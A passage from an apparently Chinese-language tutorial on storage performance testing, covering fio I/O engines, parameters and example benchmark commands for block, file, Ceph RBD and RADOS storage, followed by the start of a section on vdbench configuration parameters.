本身的开销或用作控制组；</li><li><code>net</code> : 用于网络 I&#x2F;O 性能测试。这种引擎可以模拟网络数据发送和接收，用于评估网络设备和协议的性能；</li><li><code>netsplice</code> : 使用 splice() 和网络套接字结合的方式进行数据传输。这种方法可以直接在内核中转移数据到网络套接字，减少用户空间和内核空间之间的数据复制；</li><li><code>ftruncate</code> : 使用 ftruncate() 系统调用来改变文件的大小。这种引擎主要用于测试文件系统如何处理文件大小的变化，特别是在文件系统扩展和收缩时的性能；</li><li><code>filecreate</code> : 专注于文件创建操作。使用这个引擎可以测试文件系统创建新文件的性能，这对于评估文件系统的元数据操作性能非常重要；</li><li><code>filestat</code> : 用于测试文件状态操作，如使用 stat() 系统调用。这可以帮助评估文件系统在处理文件元数据查询时的效率；</li><li><code>filedelete</code> : 用于测试文件删除操作的性能。它可以帮助用户了解在特定存储系统上删除文件所需的时间和资源消耗；</li><li><code>dircreate</code> : 用于测试目录创建操作的性能。使用这个引擎可以测量创建新目录所需的时间；</li><li><code>dirstat</code> : 用于测试获取目录状态的操作性能，比如读取目录中的文件列表；</li><li><code>dirdelete</code> : 用于测试删除目录的性能；</li><li><code>exec</code> : 允许fio执行外部命令或脚本，这可以用来测试系统在执行特定命令或脚本时的I&#x2F;O性能；</li><li><code>posixaio</code> : 使用 POSIX 异步 I&#x2F;O 接口。这种引擎在多平台上提供异步 I&#x2F;O 功能，但在 Linux 上通常不如 libaio 高效；</li><li><code>falloc</code> : 使用 fallocate() 系统调用来预分配文件空间。这种方法可以在文件实际写入之前确保空间被分配，用于测试文件系统如何处理空间分配请求；</li><li><code>e4defrag</code> : 专门用于测试 ext4 文件系统的碎片整理操作。这可以帮助评估 ext4 文件系统在长时间运行后，文件碎片整理对性能的影响；</li><li><code>splice</code> : 使用 Linux 的 splice() 系统调用来移动数据。这种方法可以在两个文件描述符之间直接传输数据，减少数据复制操作的开销；</li><li><code>mtd</code> : 针对内存技术设备（Memory Technology Device）的 I&#x2F;O 引擎。MTD 设备通常是嵌入式存储设备，如闪存，不具备常见的块设备接口。这个引擎允许 fio 直接与这类设备进行交互，测试其性能，特别是在嵌入式系统或 IoT 设备中非常有用；</li><li><code>sg</code> : 使用 SCSI generic (sg) 接口进行 I&#x2F;O 操作的引擎。这个引擎允许 fio 直接与 SCSI 设备进行交互，绕过传统的块设备层。这对于需要直接评估 SCSI 命令性能或进行低级别 SCSI 测试的场景非常有用；</li><li><code>io_uring</code> : 利用 Linux 的 io_uring 接口进行 I&#x2F;O 操作。这是一种现代的异步 I&#x2F;O 接口，提供了比传统 AIO 更高的性能和更低的 CPU 使用率；</li><li><code>io_uring_cmd</code> : 擎利用了Linux的io_uring接口，这是一种高效的异步I&#x2F;O执行方式。io_uring_cmd引擎可以帮助开发者测试和优化使用io_uring接口的应用程序的性能；</li><li><code>libaio</code> : 利用 Linux 的异步 I&#x2F;O 子系统（AIO）。这种引擎可以在不阻塞应用程序的情况下提交和完成 I&#x2F;O，适用于高性能和高并发的 I&#x2F;O 测试；</li><li><code>rdma</code> : 使用远程直接内存访问（RDMA）技术进行数据传输。这种引擎适用于需要高性能网络通信的场景，如数据中心内部或高性能计算环境；</li><li><code>rados</code> : 专为测试 Ceph RADOS 存储集群设计的引擎。它直接与 Ceph 的 RADOS 层交互，用于评估 Ceph 集群的性能；</li><li><code>rbd</code> : 针对 Ceph 块设备（RBD）的 I&#x2F;O 引擎。它允许直接对 Ceph 块存储进行性能测试，适用于评估虚拟化环境中的存储性能；</li><li><code>http</code> : 使fio能够执行HTTP请求，从而测试HTTP服务器的性能。这包括了解服务器处理请求的能力，以及在高负载下的稳定性和响应时间；</li></ul><p><strong>相关参数:</strong> (使用 <code>fio --cmdhelp=all</code> 命令列出)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">description             : 文本工作描述<br>name                    : 此工作的名称<br>wait_for                : 此工作在开始前需要等待的工作名称<br>filename                : 用于工作负载的文件<br>  lockfile              : 执行 IO 时的锁文件<br>directory               : 存储文件的目录<br>filename_format         : 覆盖默认的 <span class="hljs-variable">$jobname</span>.<span class="hljs-variable">$jobnum</span>.<span class="hljs-variable">$filenum</span> 命名<br>unique_filename         : 对于网络客户端，文件名前缀为源 IP<br>opendir                 : 递归添加此目录及其下的文件<br>rw                      : IO 方向，可选值为 <span class="hljs-built_in">read</span>/write/trim/randread/randwrite/randtrim/rw/readwrite/randrw/trimwrite ，默认值为 <span class="hljs-built_in">read</span> ；<br>  bs                    : 块大小单位<br>  ba                    : IO 块偏移对齐<br>  bsrange               : 设置块大小范围（比 bs 更详细）<br>  bssplit               : 设置特定的块大小混合<br>  bs_unaligned          : 不对 IO 缓冲区大小进行扇区对齐<br>  randrepeat            : 使用可重复的随机 IO 模式<br>  randseed              : 设置随机生成器的种子值<br>  norandommap           : 接受可能的重复随机块<br>  ignore_error          : 设置要忽略的特定错误列表<br>rw_sequencer            : IO 偏移生成器修饰符<br>ioengine                : 使用的 IO 引擎<br>iodepth                 : 保持在运行中的 IO 缓冲区数量<br>  iodepth_batch         : 一次提交的 IO 缓冲区数量<br>  iodepth_batch_complete_min: 一次检索的最小 IO 缓冲区数量<br>  iodepth_batch_complete_max: 一次检索的最大 IO 缓冲区数量<br>  iodepth_low           : 排队深度的低水位线<br>  serialize_overlap     : 等待重叠的在运行 IO 完成<br>io_submit_mode          : IO 提交和完成的方式<br>size                    : 设备或文件的总大小<br>io_size                 : 要执行的 I/O 总大小<br>fill_device             : 写入直到发生 ENOSPC 错误<br>filesize                : 单个文件的大小<br>file_append             : IO 将从文件末尾开始<br>offset                  : 从此偏移开始 IO<br>  offset_increment      : 从一个偏移到下一个偏移的增量<br>offset_align            : 从此偏移对齐开始 IO<br>number_ios              : 在此 IO 数量后强制完成工作<br>random_generator        : 使用的随机数生成器类型<br>random_distribution     : 随机偏移分布生成器<br>percentage_random       : 顺序/随机混合中应为随机的百分比<br>allrandrepeat           : 对所有内容使用可重复的随机数<br>nrfiles                 : 在此文件数量之间分配工作负载<br>  file_service_type     : 如何选择下一个要服务的文件<br>openfiles               : 同时保持打开的文件数量<br>fallocate               : 布局文件时是否进行预分配<br>fadvise_hint            : 使用 fadvise() 向内核建议 IO 模式<br>fsync                   : 每给定块数为写入发出 fsync<br>fdatasync               : 每给定块数为写入发出 fdatasync<br>write_barrier           : 每第 N 次写入作为屏障写入<br>sync_file_range         : 使用 sync_file_range()<br>direct                  : 使用 O_DIRECT IO（否定缓冲）<br>atomic                  : 使用带 O_DIRECT 的原子 IO（意味着 O_DIRECT）<br>buffered                : 使用缓冲 IO（否定直接）<br>  <span class="hljs-built_in">sync</span>                  : 对缓冲写入使用 O_SYNC<br>overwrite               : 写入时，设置是否覆盖当前数据<br>loops                   : 运行工作的次数<br>numjobs                 : 复制此工作的次数<br>startdelay              : 仅在此时间段过去后开始工作<br>runtime                 : 在经过此时间后停止工作负载<br>time_based              : 继续运行直到达到运行时间/超时<br>verify_only             : 验证先前写入的数据仍然有效<br>ramp_time               : 在测量性能前的加速时间<br>clocksource             : 使用的时间源类型<br>mem                     : IO 缓冲区的支持类型<br>verify                  : 验证写入的数据<br>  do_verify             : 写入后运行验证阶段<br>  verify_interval       : 每 N 字节存储验证缓冲区头<br>  verify_offset         : 将验证头位置偏移 N 字节<br>  verify_pattern        : IO 缓冲区的填充模式<br>  verify_fatal          : 在单个验证失败时退出，不继续<br>  verify_dump           : 在失败时转储良好和坏块的内容<br>  verify_async          : 使用的异步验证器线程数量<br>  verify_backlog        : 写入此数量的块后进行验证<br>  verify_backlog_batch  : 验证此数量的 IO 块<br>  experimental_verify   : 启用实验性验证<br>  verify_state_load     : 加载验证终止状态<br>  verify_state_save     : 在终止时保存验证状态<br>  trim_percentage       : 要修剪（即丢弃）的验证块数量<br>    trim_verify_zero    : 验证修剪（即丢弃）的块是否返回为零<br>    trim_backlog        : 写入此数量的块后进行修剪<br>    trim_backlog_batch  : 修剪此数量的 IO 块<br>write_iolog             : 将 IO 模式存储到文件<br>read_iolog              : 从文件回放 IO 模式<br>  read_iolog_chunked    : 分块解析 IO 模式<br>  replay_no_stall       : 尽可能快地回放 IO 模式文件而不暂停<br>  replay_redirect       : 将所有 I/O 重放到此设备，无论跟踪设备如何<br>  replay_scale          : 将偏移对齐到此块大小<br>  replay_align          : 按此因子缩小偏移<br>  replay_time_scale     : 缩放重放事件的时间<br>  replay_skip           : 跳过某些 IO 类型（读、写、修剪、刷新）<br>merge_blktrace_file     : 合并的 blktrace 输出文件名<br>merge_blktrace_scalars  : 缩放每个跟踪的百分比<br>merge_blktrace_iters    : 每个跟踪运行的迭代次数<br>exec_prerun             : 在运行工作之前执行此文件<br>exec_postrun            : 在运行工作之后执行此文件<br>ioscheduler             : 在支持设备上使用此 IO 调度程序<br>zonemode                : zonesize、zonerange 和 zoneskip 参数的模式<br>zonesize                : 每个区域读取的数据量<br>zonerange               : 给出 IO 区域的大小<br>zoneskip                : IO 区域之间的空间<br>read_beyond_wp          : 允许读取超出区域写入指针<br>max_open_zones          : 将随机写入限制为 SMR 驱动器的指定顺序区域数量<br>zone_reset_threshold    : 分区块设备重置阈值<br>zone_reset_frequency    : 分区块设备区域重置频率（以 HZ 为单位）<br>lockmem                 : 锁定此内存量（每个工作者）<br>rwmixread               : 混合工作负载中读取的百分比<br>rwmixwrite              : 混合工作负载中写入的百分比<br><span class="hljs-built_in">nice</span>                    : 设置工作 CPU <span class="hljs-built_in">nice</span> 值<br>prio                    : 设置工作 IO 优先级值<br>prioclass               : 设置工作 IO 优先级类<br>thinktime               : IO 缓冲区之间的空闲时间（微秒）<br>  thinktime_spin        : 通过旋转此时间量（微秒）开始思考时间<br>  thinktime_blocks      : <span class="hljs-string">&#x27;thinktime&#x27;</span> 之间的 IO 缓冲区周期<br>rate                    : 设置带宽速率<br>  rate_min              : 工作必须达到此速率，否则将关闭<br>  rate_process          : 控制如何管理速率 IO 的进程<br>  rate_cycle            : 速率限制的窗口平均值（毫秒）<br>  rate_ignore_thinktime : 速率 IO 忽略思考时间设置<br>rate_iops               : 将 IO 使用限制为此数量的 IO 操作/秒<br>  rate_iops_min         : 工作必须达到此速率，否则将关闭<br>max_latency             : 最大容忍的 IO 延迟（微秒）<br>latency_target          : 支持此延迟的最大队列深度<br>latency_window          : 维持 latency_target 的时间<br>latency_percentile      : IO 的百分比必须低于 latency_target<br>latency_run             : 不断调整队列深度以匹配 latency_target<br>invalidate              : 在运行工作之前使缓冲区/页面缓存失效<br>write_hint              : 设置预期的写入寿命<br>create_serialize        : 序列化创建工作文件<br>create_fsync            : 创建后 fsync 文件<br>create_on_open          : 在打开进行 IO 时创建文件<br>create_only             : 仅执行文件创建阶段<br>allow_file_create       : 允许 fio 创建文件，如果它们不存在<br>allow_mounted_write     : 允许写入已挂载的分区<br>pre_read                : 在开始正式测试之前预读文件<br>cpumask                 : CPU 亲和性掩码<br>cpus_allowed            : 设置允许的 CPU<br>  cpus_allowed_policy   : cpus_allowed 的分配策略<br>numa_cpu_nodes          : NUMA CPU 节点绑定<br>numa_mem_policy         : NUMA 内存策略设置<br>end_fsync               : 在工作结束时包含 fsync<br>fsync_on_close          : 关闭时 fsync 文件<br><span class="hljs-built_in">unlink</span>                  : 工作完成后取消链接创建的文件<br>unlink_each_loop        : 在工作中的每个循环完成后取消链接创建的文件<br>exitall                 : 当一个工作退出时终止所有工作<br>exit_what               : 对 exitall 的细粒度控制<br>exitall_on_error        : 当一个工作出错退出时终止所有工作<br>stonewall               : 在此工作和之前的工作之间插入硬屏障<br>new_group               : 标记新组的开始（用于报告）<br>thread                  : 使用线程而不是进程<br>per_job_logs            : 在生成的日志文件中包含工作编号与否<br>write_bw_log            : 在运行期间写入带宽日志<br>  bwavgtime             : 计算带宽的时间窗口（毫秒）<br>write_lat_log           : 在运行期间写入延迟日志<br>write_iops_log          : 在运行期间写入 IOPS 日志<br>  iopsavgtime           : 计算 IOPS 的时间窗口（毫秒）<br>log_avg_msec            : 在此时间段内平均 bw/iops/lat 日志<br>log_hist_msec           : 以此时间值的频率转储完成延迟直方图<br>log_hist_coarseness     : 范围 [0,6] 的整数。较高的粗糙度输出每个样本的直方图箱数较少。这些的箱数分别为 [1216, 608, 304, 152, 76, 38, 19]。<br>write_hist_log          : 在运行期间写入延迟直方图日志<br>log_max_value           : 在窗口中记录最大样本而不是平均值<br>log_offset              : 为每个日志条目包含 IO 的偏移<br>log_compression         : 以此大小的压缩块记录<br>  log_compression_cpus  : 将日志压缩限制在这些 CPU 上<br>log_store_compressed    : 以压缩格式存储日志<br>log_unix_epoch          : 在日志文件中使用 Unix 时间<br>block_error_percentiles : 记录修剪块错误并制作直方图<br>group_reporting         : 按组进行报告<br>stats                   : 启用统计数据收集<br>zero_buffers            : 将 IO 缓冲区初始化为全零<br>refill_buffers          : 在每次 IO 提交时重新填充 IO 缓冲区<br>scramble_buffers        : 在每次 IO 提交时稍微扰乱缓冲区<br>buffer_pattern          : IO 缓冲区的填充模式<br>buffer_compress_percentage: 缓冲区的可压缩性（大约）<br>  buffer_compress_chunk : 缓冲区中可压缩区域的大小<br>dedupe_percentage       : 可去重的缓冲区百分比<br>clat_percentiles        : 启用完成延迟百分位数的报告<br>lat_percentiles         : 启用 IO 延迟百分位数的报告<br>slat_percentiles        : 启用提交延迟百分位数的报告<br>percentile_list         : 指定要报告的完成延迟和块错误的自定义百分位数列表<br>significant_figures     : 输出格式设置为正常的有效数字<br>disk_util               : 记录磁盘利用率统计<br>gtod_reduce             : 大大减少 gettimeofday() 调用的数量<br>  disable_lat           : 禁用延迟数字<br>  disable_clat          : 禁用完成延迟数字<br>  disable_slat          : 禁用提交延迟数字<br>  disable_bw_measurement: 禁用带宽记录<br>gtod_cpu                : 在此 CPU 上设置专用的 gettimeofday() 线程<br>unified_rw_reporting    : 统一跨数据方向的报告<br>continue_on_error       : 在 IO 期间的非致命错误上继续<br>error_dump              : 转储每个错误的信息<br>profile                 : 选择特定的内置性能测试<br>cgroup                  : 将工作添加到此名称的 cgroup<br>  cgroup_nodelete       : 工作完成后不删除 cgroup<br>  cgroup_weight         : 使用给定的 cgroup 权重<br>uid                     : 使用此用户 ID 运行工作<br>gid                     : 使用此组 ID 运行工作<br>kb_base                 : 数据量的单位前缀解释（IEC 和 SI）<br>unit_base               : 结果摘要数据的位倍数（字节为 8，位为 1）<br>hugepage-size           : 使用大页时，指定每页的大小<br>flow_id                 : 使用的流索引 ID<br>  flow                  : 此工作的流控制权重<br>  flow_watermark        : 流控制的高水位线。此选项应为所有具有非零流的线程设置为相同值。<br>  flow_sleep            : 在被流控制机制阻止后休眠的微秒数<br>steadystate             : 定义判断工作何时达到稳态的标准和限制<br>  steadystate_duration  : 在达到稳态指定持续时间后停止工作负载<br>  steadystate_ramp_time : 数据收集的延迟时间，用于稳态工作终止测试<br></code></pre></td></tr></table></figure><h2 id="4-2、测试命令示例"><a href="#4-2、测试命令示例" class="headerlink" title="4.2、测试命令示例"></a>4.2、测试命令示例</h2><h3 id="4-2-1、裸设备-块存储性能测试"><a href="#4-2-1、裸设备-块存储性能测试" class="headerlink" title="4.2.1、裸设备&#x2F;块存储性能测试"></a>4.2.1、裸设备&#x2F;块存储性能测试</h3><p><strong>测试命令(使用 libaio 引擎):</strong></p><p>官方示例的 fio 文件: <a href="https://github.com/axboe/fio/blob/fio-3.40/examples/aio-read.fio">https://github.com/axboe/fio/blob/fio-3.40/examples/aio-read.fio</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 随机读 IOPS</span><br>fio --name=rand-read-iops \<br>    --direct=1 \<br>    --iodepth=128 \<br>    --rw=randread \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br><br><span class="hljs-comment"># 随机写 IOPS</span><br>fio --name=rand-write-iops \<br>    --direct=1 \<br>    --iodepth=128 \<br>    --rw=randwrite \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序读吞吐</span><br>fio --name=seq-read-bw \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=<span class="hljs-built_in">read</span> \<br>    --ioengine=libaio \<br>    --bs=1m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序写吞吐</span><br>fio --name=seq-write-bw \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=write \<br>    --ioengine=libaio \<br>    --bs=1m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br><br><span class="hljs-comment"># 随机读时延</span><br>fio --name=rand-read-latency \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=randread \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br><br><span class="hljs-comment"># 随机写时延</span><br>fio --name=rand-write-latency \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=randwrite \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --filename=/dev/sdc \<br>    --group_reporting<br></code></pre></td></tr></table></figure><p><strong>ceph 块存储测试命令(使用 rbd 引擎):</strong></p><p>官方示例的 fio 文件: <a href="https://github.com/axboe/fio/blob/fio-3.40/examples/rbd.fio">https://github.com/axboe/fio/blob/fio-3.40/examples/rbd.fio</a></p><p><strong>相关参数( rbd 引擎):</strong></p><ul><li><code>clustername</code> : Ceph 的集群名称；</li><li><code>pool</code> : 托管 RBD 引擎的 RBD 的池名称；</li><li><code>rbdname</code> : RBD 引擎的 RBD 名称，对应镜像名称；</li><li><code>clientname</code> : 访问 RBD 引擎的 RBD 的 Ceph 客户端名称；</li><li><code>busy_poll</code> : 完成任务后使用 busy pool ，而不是使用 sleeping ；</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 随机读 IOPS</span><br>fio --name=rand-read \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=randread \<br>    --ioengine=rbd \<br>    --clientname=admin \<br>    --pool=tp03 \<br>    --rbdname=img01 \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --group_reporting<br><br><span class="hljs-comment"># 随机写 IOPS</span><br>fio --name=rand-write \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=randwrite \<br>    --ioengine=rbd \<br>    --clientname=admin \<br>    --pool=tp03 \<br>    --rbdname=img01 \<br>    --bs=4k \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序读吞吐</span><br>fio --name=seq-read \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=<span class="hljs-built_in">read</span> \<br>    --ioengine=rbd \<br>    --clientname=admin \<br>    --pool=tp03 \<br>    --rbdname=img01 \<br>    --bs=4m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序写吞吐</span><br>fio --name=seq-write \<br>    --direct=1 \<br>    --iodepth=64 \<br>    --rw=write \<br>    --ioengine=rbd \<br>    --clientname=admin \<br>    --pool=tp03 \<br>    --rbdname=img01 \<br>    --bs=4m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --group_reporting<br></code></pre></td></tr></table></figure><h3 id="4-2-2、文件存储性能测试"><a href="#4-2-2、文件存储性能测试" class="headerlink" title="4.2.2、文件存储性能测试"></a>4.2.2、文件存储性能测试</h3><p><strong>基础命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载特定文件系统到 /mnt/data 目录</span><br></code></pre></td></tr></table></figure><p><strong>测试命令(使用 libaio 引擎):</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 随机读</span><br>fio --name=rand-read \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=randread \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=5G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --directory=/mnt/data \<br>    --nrfiles=64 \<br>    --group_reporting<br><br><span class="hljs-comment"># 随机写</span><br>fio --name=rand-write \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=randwrite \<br>    --ioengine=libaio \<br>    --bs=4k \<br>    --size=5G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --directory=/mnt/data \<br>    --nrfiles=64 \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序读</span><br>fio --name=seq-read \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=<span class="hljs-built_in">read</span> \<br>    --ioengine=libaio \<br>    --bs=4m \<br>    --size=10G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --directory=/mnt/data \<br>    --nrfiles=64 \<br>    --group_reporting<br><br><span class="hljs-comment"># 顺序写</span><br>fio --name=seq-write \<br>    --direct=1 \<br>    --iodepth=1 \<br>    --rw=write \<br>    --ioengine=libaio \<br>    --bs=4m \<br>    --size=10G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --end_fsync=1 \<br>    --directory=/mnt/data \<br>    --nrfiles=64 \<br>    --group_reporting<br></code></pre></td></tr></table></figure><h3 id="4-2-3、对象存储性能测试"><a href="#4-2-3、对象存储性能测试" class="headerlink" title="4.2.3、对象存储性能测试"></a>4.2.3、对象存储性能测试</h3><p><strong>Ceph 相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ceph config dump<br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/ALERTMANAGER_API_HOST <span class="hljs-variable">$val</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/GRAFANA_API_URL <span class="hljs-variable">$val</span><br>ceph config <span class="hljs-built_in">set</span> mgr mgr/dashboard/PROMETHEUS_API_HOST <span class="hljs-variable">$val</span><br><br><span class="hljs-comment"># 启用对象存储</span><br>ceph mgr module <span class="hljs-built_in">enable</span> rgw<br>ceph orch apply rgw foo<br><br><span class="hljs-comment"># 创建 s3 的兼容用户</span><br>radosgw-admin user create --uid s3user --display-name <span class="hljs-string">&quot;Ceph S3 User Demo&quot;</span><br><br><span class="hljs-comment"># 查询 ceph 中 rgw 对应的用户信息（获取 access_key 和 secret_key）</span><br>radosgw-admin user info --uid s3user<br></code></pre></td></tr></table></figure><p>官方示例的 fio 文件: <a href="https://github.com/axboe/fio/blob/fio-3.40/examples/http-s3.fio">https://github.com/axboe/fio/blob/fio-3.40/examples/http-s3.fio</a></p><p><strong>相关参数( http 引擎):</strong></p><ul><li><code>https</code> : 启用 https ；</li><li><code>http_host</code> : 主机名 (S3 存储桶)；</li><li><code>http_user</code> : HTTP 用户名；</li><li><code>http_pass</code> : HTTP 密码；</li><li><code>http_s3_key</code> : S3 密钥；</li><li><code>http_s3_keyid</code> : S3 密钥 ID ；</li><li><code>http_swift_auth_token</code> : OpenStack Swift 认证令牌；</li><li><code>http_s3_region</code> : S3 区域；</li><li><code>http_s3_sse_customer_key</code> : S3 SSE 客户密钥；</li><li><code>http_s3_sse_customer_algorithm</code> : S3 SSE 客户算法；</li><li><code>http_s3_storage_class</code> : S3 存储类；</li><li><code>http_mode</code> : 是否使用 WebDAV、Swift 或 S3 ；</li><li><code>http_verbose</code> : 增加 http 引擎的详细程度；</li></ul><p><strong>测试命令(使用 http 引擎):</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建</span><br><br><br><span class="hljs-comment"># 删除</span><br><br></code></pre></td></tr></table></figure><h3 id="4-2-4、ceph-rados-对象存储性能测试"><a href="#4-2-4、ceph-rados-对象存储性能测试" class="headerlink" title="4.2.4、ceph rados 对象存储性能测试"></a>4.2.4、ceph rados 对象存储性能测试</h3><p>官方示例的 fio 文件: <a href="https://github.com/axboe/fio/blob/fio-3.40/examples/rados.fio">https://github.com/axboe/fio/blob/fio-3.40/examples/rados.fio</a></p><p><strong>相关参数( rados 引擎):</strong></p><ul><li><code>clustername</code> : Ceph 集群名称；</li><li><code>pool</code> : 要进行基准测试的 Ceph 池名称；</li><li><code>clientname</code> : 访问 RADOS 引擎的 Ceph 客户端名称；</li><li><code>conf</code> : Ceph 配置文件的路径；</li><li><code>busy_poll</code> : 完成后 busy pool ，而不是使用 sleeping ；</li><li><code>touch_objects</code> : 在启动时触碰（创建）对象；</li></ul><p><strong>测试命令(使用 rados 引擎):</strong> 无论是顺序&#x2F;随机读，还是顺序&#x2F;随机写，fio 内部实现的 rados 的操作都只对应同一个读写操作，分别是：rados_aio_write 和 rados_aio_read 。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 读测试</span><br>fio --name=rand-read \<br>    --direct=1 \<br>    --iodepth=32 \<br>    --rw=<span class="hljs-built_in">read</span> \<br>    --ioengine=rados \<br>    --pool=tp04 \<br>    --clientname=admin \<br>    --conf=/etc/ceph/ceph.conf \<br>    --bs=4m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --nrfiles=32 \<br>    --group_reporting<br><br><span class="hljs-comment"># 写测试</span><br>fio --name=rand-read \<br>    --direct=1 \<br>    --iodepth=32 \<br>    --rw=write \<br>    --ioengine=rados \<br>    --pool=tp04 \<br>    --clientname=admin \<br>    --conf=/etc/ceph/ceph.conf \<br>    --bs=4m \<br>    --size=1G \<br>    --numjobs=1 \<br>    --runtime=1000 \<br>    --nrfiles=32 \<br>    --group_reporting<br></code></pre></td></tr></table></figure><h1 id="五、vdbench"><a href="#五、vdbench" class="headerlink" title="五、vdbench"></a>五、vdbench</h1><p><strong>用途:</strong></p><ul><li>测试块存储性能；</li><li>测试文件存储性能；</li></ul><h2 id="5-1、测试配置参数"><a href="#5-1、测试配置参数" class="headerlink" title="5.1、测试配置参数"></a>5.1、测试配置参数</h2><h3 id="5-1-1、块存储测试配置参数"><a href="#5-1-1、块存储测试配置参数" class="headerlink" title="5.1.1、块存储测试配置参数"></a>5.1.1、块存储测试配置参数</h3><p><strong>块存储测试配置参数的定义顺序: HD, SD, WD, RD</strong></p><ul><li><code>HD</code> : （ Host Define 主机定义），非必选项，单机运行时不需要配置 HD 参数，一般只有在多主机联机（给多个主机命名，以便在结果中区分）测试时才需要配置；<ul><li><code>hd</code> : 标识主机定义的名称，多主机运行时，可以使用 hd1、hd2、hd3…区分；</li><li><code>system</code> : 主机 IP 地址或主机名；</li><li><code>vdbench</code> : vdbench 执行文件存放路径，当多主机存放路径不同时，可在 hd 定义时单独指定；</li><li><code>user</code> : master&#x2F;slave 通信使用的用户名；</li><li><code>shell</code> : 在多主机联机测试时， mater&#x2F;slave 主机间通信方式，可选值为 rsh&#x2F;ssh&#x2F;vdbench ，默认值为 rsh 。当参数值为 rsh 时，需要配置 master&#x2F;slave 主机 rsh 互信，考虑到 rsh 使用明文传输，安全级别不够，通常情况下不建议使用这种通信方式；当参数值为 ssh 时，需要配置 master&#x2F;slave 主机 ssh 互信，通常 Linux 主机联机时使用此通信方式；当参数值为 vdbench ，需要在所有 slave 主机运行 vdbench rsh 启用 vdbench 本身的 rsh 守护进程，通常 Window 主机联机时使用此通信方式；</li></ul></li><li><code>SD</code> : （ Storage Define 存储定义）；<ul><li><code>sd</code> : 标识存储定义的名称；</li><li><code>hd</code> : 标识主机定义的名称；</li><li><code>lun</code> : 写入块设备，如 &#x2F;dev&#x2F;sdb, &#x2F;dev&#x2F;sdc…；</li><li><code>openflags</code> : 通过设置为 o_direct ，以无缓冲缓存的方式进行读写操作；</li><li><code>threads</code> : 对 SD 的最大并发 I&#x2F;O 请求数量；</li></ul></li><li><code>WD</code> : （ Workload Define 工作负载定义）；<ul><li><code>wd</code> : 标识工作负载定义的名称；</li><li><code>sd</code> : 标识存储定义的名称；</li><li><code>seekpct</code> : 随机寻道的百分比，可选值为 0 或 100 (也可使用 sequential 或 random 表示)，默认值为 100 。设置为 0 时表示顺序，设置为 100 时表示随机；</li><li><code>rdpct</code> : 读取请求占请求总数的百分比，设置为 0 时表示写，设置为 100 时表示读；</li><li><code>xfersize</code> : 要传输的数据大小。默认设置为 4k ；</li><li><code>skew</code> : 非必选项，一般在多个工作负载时需要指定，表示该工作负载占总工作量百分比（ skew 总和为 100 ）；</li></ul></li><li><code>RD</code> : （ Run Define 运行定义）；<ul><li><code>rd</code> : 标识运行定义的名称；</li><li><code>wd</code> : 标识工作负载定义的名称；</li><li><code>iorate</code> : 此工作负载的固定 I&#x2F;O 速率，常用可选值为 100、max 。当参数值为 100 时，以每秒 100 个 I&#x2F;Os 的速度运行工作负载，当参数值设置为一个低于最大速率的值时，可以达到限制读写速度的效果。当参数值为 max 时，以最大的 I&#x2F;O 速率运行工作负载，一般测试读写最大性能时，该参数值均 max ；</li><li><code>warmup</code> : 预热时间（单位为秒），默认情况下 vdbench 会将第一个时间间隔输出数据排除在外，程序在预热时间内的测试不纳入最终测试结果中（即预热结束后，才开始正式测试）。当 interval &#x3D; 5 、 elapsed &#x3D; 600 时，测试性能为 2 到 elapsed &#x2F; interval ，即 (avg_2 - 120) 时间间隔内的平均性能。当 interval &#x3D; 5 、warmup &#x3D; 60 、elapsed &#x3D; 600 时，测试性能为 1 + (warmup &#x2F; interval) 到 